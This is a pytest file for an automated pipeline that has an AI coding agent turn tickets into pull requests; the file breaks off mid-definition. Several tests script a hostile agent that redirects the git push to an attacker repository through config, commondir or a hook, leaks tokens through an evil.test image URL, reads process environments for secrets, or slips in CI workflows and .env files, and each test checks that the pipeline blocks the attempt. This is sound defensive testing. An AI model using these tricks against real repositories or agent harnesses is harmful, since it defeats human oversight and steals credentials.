from __future__ import annotations

import asyncio
import json
import os
import shutil
import sys
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

import pytest
from pydantic import SecretStr

from conftest import (
    REPO,
    MakePipeline,
    ScriptedAgent,
    break_differently,
    claim,
    do_nothing,
    fix_add,
    git,
)
from ticket2pr.agent.base import AgentTask
from ticket2pr.config import Settings
from ticket2pr.domain import AgentOutcome, AgentResult, Job, JobStatus
from ticket2pr.errors import PolicyViolationError, SCMError, TrackerError
from ticket2pr.pipeline import Pipeline, RunOptions, _public_error
from ticket2pr.scm.git import GitRepo, sync_tree
from ticket2pr.scm.host import LocalHost
from ticket2pr.store import JobStore
from ticket2pr.trackers.local import LocalTracker


def _pr(job: Job) -> dict[str, Any]:
    """The pull request ``LocalHost`` recorded for the job."""
    assert job.pr_url is not None
    record: dict[str, Any] = json.loads(Path(urlparse(job.pr_url).path).read_text())
    return record


def _branch(job: Job) -> str:
    assert job.branch is not None
    return job.branch


async def test_happy_path_opens_pr_and_comments(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path, tickets_dir: Path
) -> None:
    agent = ScriptedAgent([fix_add])
    job = claim(store, "CALC-1")
    assert job is not None

    job = await make_pipeline(agent).run(job)

    assert job.status is JobStatus.SUCCEEDED, job.error
    assert job.tests_passed is True
    assert job.branch == "ticket2pr/calc-1"
    assert job.usage.cost_usd == pytest.approx(0.5)
    pr = _pr(job)
    assert pr["draft"] is False
    assert pr["title"] == "[CALC-1] add() subtracts instead of adding"
    assert "✅ passed" in str(pr["body"])
    assert "git push" in str(pr["body"])  # guardrail events are surfaced to reviewers
    # The branch really landed on the "remote", authored by the bot identity.
    origin = repos_dir / REPO
    author, subject = (
        git(origin, "log", "-1", "--format=%an <%ae>|%s", _branch(job)).strip().split("|")
    )
    assert author == "ticket2pr <ticket2pr@users.noreply.github.com>"
    assert subject == "CALC-1: add() subtracts instead of adding"
    assert "return a + b" in git(origin, "show", f"{_branch(job)}:calc.py")
    comments = (tickets_dir / "CALC-1.comments.md").read_text()
    assert "opened a pull request" in comments
    assert "Tests pass" in comments
    # The agent got the repo guidelines and the test command.
    assert "Keep functions pure." in agent.tasks[0].repo_guidelines
    assert agent.tasks[0].test_command is not None
    assert agent.tasks[0].budget_usd == pytest.approx(2.0)
    assert job.id is not None
    stored = store.get(job.id)
    assert stored is not None
    assert stored.status is JobStatus.SUCCEEDED


async def test_failing_tests_trigger_one_retry_with_feedback_then_draft(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    agent = ScriptedAgent([break_differently, break_differently])
    job = await make_pipeline(agent).run(claim(store, "CALC-1"))

    assert job.status is JobStatus.NEEDS_REVIEW
    assert job.tests_passed is False
    assert len(agent.tasks) == 2
    assert "assert" in agent.tasks[1].feedback
    assert agent.tasks[1].budget_usd == pytest.approx(1.5)  # only what the first run left
    assert job.usage.cost_usd == pytest.approx(1.0)
    pr = _pr(job)
    assert pr["draft"] is True
    assert "❌ failed" in str(pr["body"])


async def test_retry_can_fix_the_tests(make_pipeline: MakePipeline, store: JobStore) -> None:
    agent = ScriptedAgent([break_differently, fix_add])
    job = await make_pipeline(agent).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.SUCCEEDED
    assert len(agent.tasks) == 2


async def test_no_retry_when_budget_is_spent(make_pipeline: MakePipeline, store: JobStore) -> None:
    agent = ScriptedAgent([break_differently], cost_per_run=1.9)
    job = await make_pipeline(agent).run(claim(store, "CALC-1"))
    assert len(agent.tasks) == 1
    assert job.status is JobStatus.NEEDS_REVIEW


async def test_agent_without_changes_fails_and_reports(
    make_pipeline: MakePipeline, store: JobStore, tickets_dir: Path
) -> None:
    agent = ScriptedAgent([do_nothing])
    job = await make_pipeline(agent).run(claim(store, "CALC-1"))
    # Tests fail on the untouched repo, so the agent gets a retry before giving up.
    assert len(agent.tasks) == 2
    assert job.status is JobStatus.FAILED
    assert job.error == "the agent finished without changing any file"
    assert job.pr_url is None
    assert "could not open a pull request" in (tickets_dir / "CALC-1.comments.md").read_text()


async def test_agent_error_outcome_fails_job(make_pipeline: MakePipeline, store: JobStore) -> None:
    agent = ScriptedAgent([fix_add], outcome=AgentOutcome.BUDGET_EXCEEDED)
    job = await make_pipeline(agent).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert job.error == "agent stopped: budget_exceeded"  # never the agent's own text
    assert job.usage.cost_usd == pytest.approx(0.5)  # spend is recorded even on failure


async def test_cancelled_attempt_counts_its_whole_budget(
    make_pipeline: MakePipeline,
    store: JobStore,
    tickets_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    class Hanging(ScriptedAgent):
        async def run(self, task: AgentTask) -> AgentResult:
            await asyncio.sleep(3600)
            raise AssertionError

    statuses_at_comment: list[JobStatus] = []
    original = LocalTracker.comment

    async def comment(self: LocalTracker, key: str, body: str) -> None:
        statuses_at_comment.append(store.list()[0].status)  # already recorded?
        await original(self, key, body)

    monkeypatch.setattr(LocalTracker, "comment", comment)
    run = asyncio.create_task(make_pipeline(Hanging([])).run(claim(store, "CALC-1")))
    await asyncio.sleep(0.5)
    run.cancel()
    with pytest.raises(asyncio.CancelledError):
        await run
    job = store.list()[0]
    assert job.usage.cost_capped
    assert job.usage.cost_usd == pytest.approx(2.0)  # the fixture's max_budget_usd
    assert "re-add the label" in (tickets_dir / "CALC-1.comments.md").read_text()
    assert statuses_at_comment == [JobStatus.FAILED]  # saved before the network call


async def test_protected_path_left_staged_fails_closed(
    make_pipeline: MakePipeline, store: JobStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    def leak(task: AgentTask) -> None:
        fix_add(task)
        (task.workspace / ".env").write_text("SECRET=1\n")

    async def no_unstage(self: GitRepo, paths: list[str]) -> None:
        return None

    monkeypatch.setattr(GitRepo, "unstage", no_unstage)
    job = await make_pipeline(ScriptedAgent([leak])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert job.error == "a protected path could not be unstaged"


async def test_base_branch_moved_during_the_run(
    make_pipeline: MakePipeline,
    store: JobStore,
    monkeypatch: pytest.MonkeyPatch,
    tickets_dir: Path,
) -> None:
    async def gone(self: GitRepo, branch: str, base: str) -> None:
        raise SCMError("fatal: not a commit")

    monkeypatch.setattr(GitRepo, "checkout_new_branch", gone)
    job = await make_pipeline(ScriptedAgent([fix_add])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert "moved too far during the run" in (job.error or "")
    # git/OS errors can quote names the agent chose: the ticket only learns the kind of error.
    # Worded by ticket2pr, with a remedy: the ticket gets it.
    assert (
        "moved too far during the run; re-run the ticket"
        in (tickets_dir / "CALC-1.comments.md").read_text()
    )


async def test_protected_paths_are_never_committed(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path
) -> None:
    def sneaky(task: AgentTask) -> None:
        fix_add(task)
        (task.workspace / ".github" / "workflows").mkdir(parents=True)
        (task.workspace / ".github" / "workflows" / "ci.yml").write_text("on: push\n")
        (task.workspace / ".env").write_text("SECRET=1\n")

    job = await make_pipeline(ScriptedAgent([sneaky])).run(claim(store, "CALC-1"))

    assert job.status is JobStatus.SUCCEEDED
    files = git(repos_dir / REPO, "show", "--name-only", "--format=", _branch(job)).split()
    assert files == ["calc.py"]
    body = str(_pr(job)["body"])
    assert ".github/workflows/ci.yml" in body
    assert ".env" in body


async def test_git_config_tampering_cannot_redirect_the_push(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path, tmp_path: Path
) -> None:
    attacker = tmp_path / "attacker.git"
    git(tmp_path, "init", "-q", "--bare", str(attacker))
    marker = tmp_path / "pwned"

    def tamper(task: AgentTask) -> None:
        fix_add(task)
        origin = (repos_dir / REPO).resolve().as_uri()
        git(task.workspace, "init", "-q")  # the workspace has none: the agent makes its own
        git(task.workspace, "config", f"url.{attacker.as_uri()}.insteadOf", origin)
        hook = task.workspace / ".git" / "hooks" / "pre-push"
        hook.write_text(f"#!/bin/sh\ntouch {marker}\n")
        hook.chmod(0o755)

    job = await make_pipeline(ScriptedAgent([tamper])).run(claim(store, "CALC-1"))

    assert job.status is JobStatus.SUCCEEDED
    assert git(attacker, "branch", "--list").strip() == ""
    assert _branch(job) in git(repos_dir / REPO, "branch", "--list")
    assert not marker.exists()


async def test_too_many_files_is_a_policy_violation(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    def sprawl(task: AgentTask) -> None:
        fix_add(task)
        for index in range(3):
            (task.workspace / f"extra_{index}.py").write_text("x = 1\n")

    pipeline = make_pipeline(ScriptedAgent([sprawl]), max_changed_files=2)
    job = await pipeline.run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert job.error == "the change touches too many files (limit 2)"


async def test_oversized_change_is_a_policy_violation(
    make_pipeline: MakePipeline, store: JobStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    def bloat(task: AgentTask) -> None:
        fix_add(task)
        (task.workspace / "blob.bin").write_bytes(b"x" * 2_000)

    monkeypatch.setattr("ticket2pr.pipeline._MAX_DIFF_BYTES", 1_000)
    job = await make_pipeline(ScriptedAgent([bloat])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert "exceeds 1000 bytes" in (job.error or "")


async def test_undecodable_file_names_are_refused(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    def mangle(task: AgentTask) -> None:
        fix_add(task)
        (task.workspace / os.fsdecode(b"\xff")).mkdir()
        (task.workspace / os.fsdecode(b"\xff") / ".env").write_text("SECRET=1\n")

    job = await make_pipeline(ScriptedAgent([mangle])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert job.pr_url is None
    assert "not valid UTF-8" in (job.error or "")


async def test_unlabelled_ticket_is_skipped_without_comment(
    make_pipeline: MakePipeline, store: JobStore, tickets_dir: Path
) -> None:
    agent = ScriptedAgent([fix_add])
    job = await make_pipeline(agent).run(claim(store, "CALC-2"))
    assert job.status is JobStatus.SKIPPED
    assert agent.tasks == []
    assert not (tickets_dir / "CALC-2.comments.md").exists()


async def test_label_check_can_be_disabled(make_pipeline: MakePipeline, store: JobStore) -> None:
    job = await make_pipeline(ScriptedAgent([fix_add])).run(
        claim(store, "CALC-2"), RunOptions(require_label=False)
    )
    assert job.status is JobStatus.SUCCEEDED


async def test_unmapped_project_fails(
    make_pipeline: MakePipeline, store: JobStore, tickets_dir: Path
) -> None:
    (tickets_dir / "OTHER-1.yaml").write_text("title: x\nlabels: [ticket2pr]\n")
    job = await make_pipeline(ScriptedAgent([fix_add])).run(claim(store, "OTHER-1"))
    assert job.status is JobStatus.FAILED
    assert "no repository mapped for OTHER-1" in (job.error or "")


async def test_missing_ticket_fails(make_pipeline: MakePipeline, store: JobStore) -> None:
    job = await make_pipeline(ScriptedAgent([fix_add])).run(claim(store, "CALC-99"))
    assert job.status is JobStatus.FAILED
    assert "no ticket file" in (job.error or "")


async def test_unexpected_exception_is_recorded(
    make_pipeline: MakePipeline, store: JobStore, tickets_dir: Path
) -> None:
    def boom(task: AgentTask) -> None:
        raise RuntimeError("kaboom")

    job = await make_pipeline(ScriptedAgent([boom])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert job.error == "internal error: RuntimeError: kaboom"
    comment = (tickets_dir / "CALC-1.comments.md").read_text()
    assert "internal error (details" in comment
    assert "kaboom" not in comment


async def test_workspace_is_removed_unless_kept(
    make_pipeline: MakePipeline, store: JobStore, settings: Settings
) -> None:
    pipeline = make_pipeline(ScriptedAgent([fix_add]))
    job = await pipeline.run(claim(store, "CALC-1"))
    assert not (settings.workspaces_dir / f"job-{job.id}").exists()

    kept = await pipeline.run(claim(store, "CALC-1"), RunOptions(keep_workspace=True))
    assert (settings.workspaces_dir / f"job-{kept.id}" / "work" / "calc.py").exists()
    assert (settings.workspaces_dir / f"job-{kept.id}" / ".keep").exists()  # spared at startup


async def test_rerun_updates_the_existing_pr(
    make_pipeline: MakePipeline, store: JobStore, tickets_dir: Path
) -> None:
    pipeline = make_pipeline(ScriptedAgent([fix_add]))
    first = await pipeline.run(claim(store, "CALC-1"))
    ticket = tickets_dir / "CALC-1.yaml"
    ticket.write_text(ticket.read_text().replace("title: add()", "title: Renamed add()"))
    second = await pipeline.run(claim(store, "CALC-1"))
    assert first.pr_url == second.pr_url


async def test_rerun_never_overwrites_a_persons_commits(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path, tmp_path: Path
) -> None:
    pipeline = make_pipeline(ScriptedAgent([fix_add]))
    first = await pipeline.run(claim(store, "CALC-1"))
    branch = _branch(first)
    clone = tmp_path / "dev"
    git(tmp_path, "clone", "-q", "--branch", branch, str(repos_dir / REPO), str(clone))
    (clone / "NOTES.md").write_text("reviewer fixup\n")
    git(clone, "add", "NOTES.md")
    git(clone, "-c", "user.email=dev@acme.test", "commit", "-q", "-m", "fixup")
    git(clone, "push", "-q", "origin", branch)
    head = git(repos_dir / REPO, "rev-parse", branch)

    agent = ScriptedAgent([fix_add])
    second = await make_pipeline(agent).run(claim(store, "CALC-1"))
    assert second.status is JobStatus.FAILED
    assert second.error == f"{branch} has commits ticket2pr did not make; not overwriting them"
    assert git(repos_dir / REPO, "rev-parse", branch) == head
    assert agent.tasks == []  # refused before spending anything


async def test_rerun_never_overwrites_an_amended_commit(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path, tmp_path: Path
) -> None:
    """An amend keeps ticket2pr as the author; the committer tells it apart."""
    pipeline = make_pipeline(ScriptedAgent([fix_add]))
    branch = _branch(await pipeline.run(claim(store, "CALC-1")))
    clone = tmp_path / "dev"
    git(tmp_path, "clone", "-q", "--branch", branch, str(repos_dir / REPO), str(clone))
    (clone / "NOTES.md").write_text("reviewer fixup\n")
    git(clone, "add", "NOTES.md")
    git(clone, "-c", "user.email=dev@acme.test", "commit", "-q", "--amend", "--no-edit")
    git(clone, "push", "-q", "--force", "origin", branch)

    second = await pipeline.run(claim(store, "CALC-1"))
    assert second.status is JobStatus.FAILED
    assert "NOTES.md" in git(repos_dir / REPO, "show", "--name-only", "--format=", branch)


async def test_push_never_overwrites_a_concurrent_push(
    make_pipeline: MakePipeline,
    store: JobStore,
    repos_dir: Path,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A reviewer pushing between ticket2pr's check and its push is not overwritten."""
    pipeline = make_pipeline(ScriptedAgent([fix_add]))
    branch = _branch(await pipeline.run(claim(store, "CALC-1")))
    original = GitRepo.push

    async def reviewer_pushes_first(self: GitRepo, *args: Any, **kwargs: Any) -> None:
        clone = tmp_path / "dev"
        git(tmp_path, "clone", "-q", "--branch", branch, str(repos_dir / REPO), str(clone))
        git(clone, "-c", "user.email=dev@acme.test", "commit", "-q", "--allow-empty", "-m", "x")
        git(clone, "push", "-q", "origin", branch)
        await original(self, *args, **kwargs)

    monkeypatch.setattr(GitRepo, "push", reviewer_pushes_first)
    second = await pipeline.run(claim(store, "CALC-1"))
    assert second.status is JobStatus.FAILED
    assert "x" in git(repos_dir / REPO, "log", "-1", "--format=%s", branch)


async def test_without_test_command_pr_is_draft(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path
) -> None:
    git(repos_dir / REPO, "rm", "-q", "-r", "tests", "pyproject.toml")
    git(repos_dir / REPO, "commit", "-q", "-m", "drop tests")
    job = await make_pipeline(ScriptedAgent([fix_add]), test_command="").run(claim(store, "CALC-1"))
    assert job.status is JobStatus.NEEDS_REVIEW
    assert job.tests_passed is None
    assert _pr(job)["draft"] is True


async def test_commondir_redirect_cannot_hijack_the_push(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path, tmp_path: Path
) -> None:
    """Restoring .git/config is not enough: git also reads config from ``commondir``."""
    attacker = tmp_path / "attacker.git"
    git(tmp_path, "init", "-q", "--bare", str(attacker))
    evil = tmp_path / "evil-common"

    def redirect(task: AgentTask) -> None:
        fix_add(task)
        origin = (repos_dir / REPO).resolve().as_uri()
        git(task.workspace, "init", "-q")  # the workspace has none: the agent makes its own
        shutil.copytree(task.workspace / ".git", evil)
        (evil / "config").write_text(
            (evil / "config").read_text() + f'[url "{attacker.as_uri()}"]\n\tinsteadOf = {origin}\n'
        )
        (task.workspace / ".git" / "commondir").write_text(str(evil))

    job = await make_pipeline(ScriptedAgent([redirect])).run(claim(store, "CALC-1"))

    assert job.status is JobStatus.SUCCEEDED, job.error
    assert git(attacker, "branch", "--list").strip() == ""
    assert _branch(job) in git(repos_dir / REPO, "branch", "--list")


async def test_global_git_config_is_ignored(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path, tmp_path: Path
) -> None:
    attacker = tmp_path / "attacker.git"
    git(tmp_path, "init", "-q", "--bare", str(attacker))

    def poison_global_config(task: AgentTask) -> None:
        fix_add(task)
        origin = (repos_dir / REPO).resolve().as_uri()
        global_config = Path(os.environ["GIT_CONFIG_GLOBAL"])
        global_config.write_text(
            global_config.read_text() + f'[url "{attacker.as_uri()}"]\n\tinsteadOf = {origin}\n'
        )

    job = await make_pipeline(ScriptedAgent([poison_global_config])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.SUCCEEDED, job.error
    assert git(attacker, "branch", "--list").strip() == ""


async def test_a_change_to_protected_paths_only_says_so(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    def ci_only(task: AgentTask) -> None:  # runs twice: the tests stay red
        (task.workspace / ".github" / "workflows").mkdir(parents=True, exist_ok=True)
        (task.workspace / ".github" / "workflows" / "ci.yml").write_text("on: push\n")

    job = await make_pipeline(ScriptedAgent([ci_only])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert "only touches protected paths" in (job.error or "")


async def test_unusual_protected_path_names_are_not_committed(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path
) -> None:
    def sneaky(task: AgentTask) -> None:
        fix_add(task)
        (task.workspace / ".github" / "workflows").mkdir(parents=True)
        (task.workspace / ".github" / "workflows" / "évil.yml").write_text("on: push\n")
        (task.workspace / "clé.pem").write_text("key\n")
        # Pathspec magic: unstaged literally, not read as ``x/.env`` / a glob.
        (task.workspace / ":x").mkdir()
        (task.workspace / ":x" / ".env").write_text("SECRET=1\n")
        (task.workspace / ":(glob)a").mkdir()
        (task.workspace / ":(glob)a" / "id.key").write_text("key\n")

    job = await make_pipeline(ScriptedAgent([sneaky])).run(claim(store, "CALC-1"))
    files = git(repos_dir / REPO, "show", "--name-only", "--format=", _branch(job)).split()
    assert files == ["calc.py"]


async def test_secrets_in_the_change_are_never_pushed(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path
) -> None:
    def leak(task: AgentTask) -> None:
        fix_add(task)
        (task.workspace / "notes.txt").write_text("token: ghp_supersecret123\n")

    pipeline = make_pipeline(ScriptedAgent([leak]), scm_token=SecretStr("ghp_supersecret123"))
    job = await pipeline.run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert "contains a configured secret" in (job.error or "")
    assert "ticket2pr/" not in git(repos_dir / REPO, "branch", "--list")


async def test_agent_summary_secrets_are_redacted_in_the_pr(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    class LeakySummary(ScriptedAgent):
        async def run(self, task: AgentTask) -> AgentResult:
            result = await super().run(task)
            # The mask must not rebuild the image syntax _inert escaped.
            summary = "token !ghp_supersecret123(https://evil.test/p.png?d=x)"
            return result.model_copy(update={"summary": summary})

    pipeline = make_pipeline(LeakySummary([fix_add]), scm_token=SecretStr("ghp_supersecret123"))
    job = await pipeline.run(claim(store, "CALC-1"))
    body = str(_pr(job)["body"])
    assert "ghp_supersecret123" not in body
    assert "REDACTED(https://evil.test" in body
    assert "](" not in body.split("## Agent summary")[1]


async def test_secrets_in_the_ticket_title_are_redacted(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path
) -> None:
    pipeline = make_pipeline(ScriptedAgent([fix_add]), scm_token=SecretStr("subtracts"))
    job = await pipeline.run(claim(store, "CALC-1"))
    pr = _pr(job)
    assert job.branch is not None
    message = git(repos_dir / REPO, "log", "-1", "--format=%B", job.branch)
    for text in (str(pr["title"]), str(pr["body"]), message):
        assert "subtracts" not in text
        assert "REDACTED" in text


async def test_secrets_that_escaping_would_split_are_redacted(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    class LeakySummary(ScriptedAgent):
        async def run(self, task: AgentTask) -> AgentResult:
            result = await super().run(task)
            return result.model_copy(update={"summary": "hunter2#webhook"})

    pipeline = make_pipeline(
        LeakySummary([fix_add]), jira_webhook_secret=SecretStr("hunter2#webhook")
    )
    job = await pipeline.run(claim(store, "CALC-1"))
    body = str(_pr(job)["body"])
    assert "hunter2" not in body
    assert "REDACTED" in body


async def test_failed_retry_keeps_the_first_attempt_as_a_draft(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    class StopsOnRetry(ScriptedAgent):
        async def run(self, task: AgentTask) -> AgentResult:
            result = await super().run(task)
            if len(self.tasks) == 2:
                return result.model_copy(update={"outcome": AgentOutcome.BUDGET_EXCEEDED})
            return result

    job = await make_pipeline(StopsOnRetry([break_differently])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.NEEDS_REVIEW
    pr = _pr(job)
    assert pr["draft"] is True
    assert "stopped early (budget_exceeded)" in str(pr["body"])


async def test_without_drafts_the_comment_says_so(
    make_pipeline: MakePipeline, store: JobStore, tickets_dir: Path
) -> None:
    agent = ScriptedAgent([break_differently])
    job = await make_pipeline(agent, draft_on_test_failure=False).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.NEEDS_REVIEW
    assert _pr(job)["draft"] is False
    comment = (tickets_dir / "CALC-1.comments.md").read_text()
    assert "opened a pull request" in comment
    assert "Tests fail" in comment


async def test_sandbox_unavailable_fails_before_spending(
    make_pipeline: MakePipeline, store: JobStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("ticket2pr.sandbox.missing_sandbox_tools", lambda: ["socat"])
    agent = ScriptedAgent([fix_add])
    job = await make_pipeline(agent, sandbox=True).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert "missing: socat" in (job.error or "")
    assert agent.tasks == []


@pytest.mark.skipif(
    sys.platform != "linux" or shutil.which("bwrap") is None, reason="needs bubblewrap"
)
async def test_end_to_end_with_the_real_test_sandbox(
    make_pipeline: MakePipeline, store: JobStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The repository's tests really run inside bubblewrap (socat is only for the agent)."""
    monkeypatch.setattr("ticket2pr.sandbox.missing_sandbox_tools", list)
    monkeypatch.setenv("T2P_GITHUB_TOKEN", "ghp_from_the_environment")

    def fix_and_spy(task: AgentTask) -> None:
        fix_add(task)
        (task.workspace / "tests" / "test_spy.py").write_text(
            "import glob\n\n\n"
            "def test_no_secret_in_any_visible_environment():\n"
            "    for path in glob.glob('/proc/*/environ'):\n"
            "        try:\n"
            "            data = open(path, 'rb').read()\n"
            "        except OSError:\n"
            "            continue\n"
            # Split: the token itself in a committed file would be refused (redaction).
            "        assert b'ghp_from_' b'the_environment' not in data\n"
        )

    job = await make_pipeline(ScriptedAgent([fix_and_spy]), sandbox=True).run(
        claim(store, "CALC-1")
    )
    assert job.status is JobStatus.SUCCEEDED, job.error
    assert job.tests_passed is True


async def test_pr_reports_total_cost_and_every_guardrail_event(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    class Blocked(ScriptedAgent):
        async def run(self, task: AgentTask) -> AgentResult:
            result = await super().run(task)
            event = f"Bash: attempt {len(self.tasks)} blocked"
            return result.model_copy(update={"denied_actions": (event,)})

    job = await make_pipeline(Blocked([break_differently, fix_add])).run(claim(store, "CALC-1"))
    body = str(_pr(job)["body"])
    assert job.usage.cost_usd == pytest.approx(1.0)
    assert "| $1.00 |" in body
    assert "attempt 1 blocked" in body
    assert "attempt 2 blocked" in body


async def test_cancelled_run_releases_the_ticket(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    started = asyncio.Event()

    class Slow(ScriptedAgent):
        async def run(self, task: AgentTask) -> AgentResult:
            started.set()
            await asyncio.sleep(60)
            raise AssertionError("unreachable")

    job = claim(store, "CALC-1")
    running = asyncio.create_task(make_pipeline(Slow([fix_add])).run(job))
    await started.wait()
    running.cancel()
    with pytest.raises(asyncio.CancelledError):
        await running
    assert job.id is not None
    stored = store.get(job.id)
    assert stored is not None
    assert stored.status is JobStatus.FAILED
    assert stored.error == "interrupted before completion"
    assert store.claim("CALC-1", None) is not None  # the ticket can be processed again


async def test_bytecode_caches_are_never_committed(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path
) -> None:
    def fix_and_leave_caches(task: AgentTask) -> None:
        fix_add(task)
        (task.workspace / "__pycache__").mkdir()
        (task.workspace / "__pycache__" / "calc.cpython-312.pyc").write_bytes(b"\x00")
        (task.workspace / "stale.pyc").write_bytes(b"\x00")

    job = await make_pipeline(ScriptedAgent([fix_and_leave_caches])).run(claim(store, "CALC-1"))
    files = git(repos_dir / REPO, "show", "--name-only", "--format=", _branch(job)).split()
    assert files == ["calc.py"]


async def test_relative_data_dir_works(
    settings: Settings, store: JobStore, repos_dir: Path, tickets_dir: Path
) -> None:
    """The default data dir is relative; git runs in other directories than ours."""
    relative = settings.model_copy(update={"data_dir": Path(".ticket2pr")})
    relative = Settings.model_validate(relative.model_dump())  # re-run the validators
    assert relative.data_dir.is_absolute()
    pipeline = Pipeline(
        settings=relative,
        tracker=LocalTracker(tickets_dir),
        host=LocalHost(repos_dir),
        agent=ScriptedAgent([fix_add]),
        store=store,
    )
    job = await pipeline.run(claim(store, "CALC-1"))
    assert job.status is JobStatus.SUCCEEDED, job.error


async def test_clone_into_a_relative_path(repos_dir: Path, tmp_path: Path) -> None:
    repo = await GitRepo.clone((repos_dir / REPO).as_uri(), Path("rel") / "ws", branch="main")
    assert repo.path == tmp_path / "rel" / "ws"  # tests run with cwd = tmp_path
    assert (repo.path / "calc.py").exists()


async def test_fork_mode_pushes_to_the_fork_and_opens_a_cross_repo_pr(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path
) -> None:
    fork = repos_dir / "ticket2pr-bot" / "calc"
    git(repos_dir, "clone", "-q", str(repos_dir / REPO), str(fork))
    git(fork, "config", "receive.denyCurrentBranch", "ignore")

    job = await make_pipeline(ScriptedAgent([fix_add]), fork_owner="ticket2pr-bot").run(
        claim(store, "CALC-1")
    )

    assert job.status is JobStatus.SUCCEEDED, job.error
    assert _branch(job) in git(fork, "branch", "--list")
    assert _branch(job) not in git(repos_dir / REPO, "branch", "--list")
    pr = _pr(job)
    assert pr["repo"] == REPO
    assert (pr["source_repo"], pr["head"]) == ("ticket2pr-bot/calc", _branch(job))


async def test_fork_mode_pushes_to_a_fork_far_behind_the_target(
    make_pipeline: MakePipeline, store: JobStore, repos_dir: Path
) -> None:
    """A shallow publish clone could not be pushed to a fork missing its boundary commit."""
    fork = repos_dir / "ticket2pr-bot" / "calc"
    git(repos_dir, "clone", "-q", str(repos_dir / REPO), str(fork))
    git(fork, "config", "receive.denyCurrentBranch", "ignore")
    for index in range(60):  # the target moves on; nobody syncs the fork
        git(repos_dir / REPO, "commit", "-q", "--allow-empty", "-m", f"upstream {index}")

    job = await make_pipeline(ScriptedAgent([fix_add]), fork_owner="ticket2pr-bot").run(
        claim(store, "CALC-1")
    )
    assert job.status is JobStatus.SUCCEEDED, job.error


async def test_publish_config_change_blocks_the_push(
    make_pipeline: MakePipeline,
    store: JobStore,
    repos_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A leftover process editing the publish clone between clone and push is caught."""

    def sync_then_tamper(source: Path, dest: Path) -> None:
        sync_tree(source, dest)
        with (dest / ".git" / "config").open("a") as config:
            config.write('[url "https://evil.test/"]\n\tinsteadOf = file://\n')

    monkeypatch.setattr("ticket2pr.pipeline.sync_tree", sync_then_tamper)
    job = await make_pipeline(ScriptedAgent([fix_add])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert "git config changed" in (job.error or "")
    assert "ticket2pr/" not in git(repos_dir / REPO, "branch", "--list")


async def test_unsandboxed_jobs_reap_leftover_processes(
    make_pipeline: MakePipeline, store: JobStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls: list[str] = []

    def fake_kill() -> int:
        calls.append("x")
        return 2

    monkeypatch.setattr("ticket2pr.pipeline.kill_descendants", fake_kill)
    job = await make_pipeline(ScriptedAgent([fix_add])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.SUCCEEDED
    assert calls == ["x", "x", "x"]  # before cloning, before publishing, at the end


async def test_cancel_during_the_comment_keeps_the_recorded_outcome(
    make_pipeline: MakePipeline, store: JobStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    commenting = asyncio.Event()

    async def slow_comment(self: LocalTracker, key: str, markdown: str) -> None:
        commenting.set()
        await asyncio.sleep(60)

    monkeypatch.setattr(LocalTracker, "comment", slow_comment)
    job = claim(store, "CALC-1")
    running = asyncio.create_task(make_pipeline(ScriptedAgent([fix_add])).run(job))
    await commenting.wait()
    running.cancel()
    with pytest.raises(asyncio.CancelledError):
        await running
    assert job.id is not None
    stored = store.get(job.id)
    assert stored is not None
    assert stored.status is JobStatus.SUCCEEDED
    assert stored.pr_url is not None


async def test_comment_errors_never_change_the_outcome(
    make_pipeline: MakePipeline, store: JobStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    async def broken_comment(self: LocalTracker, key: str, markdown: str) -> None:
        raise OSError("read-only file system")

    monkeypatch.setattr(LocalTracker, "comment", broken_comment)
    job = await make_pipeline(ScriptedAgent([fix_add])).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.SUCCEEDED


async def test_unsandboxed_jobs_reap_on_failure_and_before_cloning(
